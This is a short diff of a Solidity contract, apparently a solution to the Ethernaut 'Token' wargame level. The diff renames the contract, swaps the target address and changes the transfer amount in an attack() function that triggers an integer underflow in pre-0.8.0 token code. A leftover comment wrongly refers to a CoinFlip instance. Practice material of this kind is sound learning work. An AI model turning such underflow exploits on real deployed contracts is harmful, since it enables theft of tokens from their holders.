@@ -10,12 +10,12 @@ interface IToken {
 }
 
 // Solidity versions below 0.8.0 are vulnerable to underflow/overflow attacks.
-contract Ethernaut_Token {
-    address constant tokenInstance = 0x0A7fF7D1e4aEFB3549413F9508AB902C189cBff3; // Replace with your CoinFlip instance
+contract UnsafeMath {
+    address constant tokenInstance = 0x813D92e2FCc7E453E161DDDFDE259369b6bF4294; // Replace with your CoinFlip instance
 
-    // This will transfer 21 tokens and trigger an underflow attack.
+    // This will transfer 1 tokens and trigger an underflow attack.
     function attack() public {
-        IToken(tokenInstance).transfer(msg.sender, 21);
+        IToken(tokenInstance).transfer(msg.sender, 1);
     }
 }
 
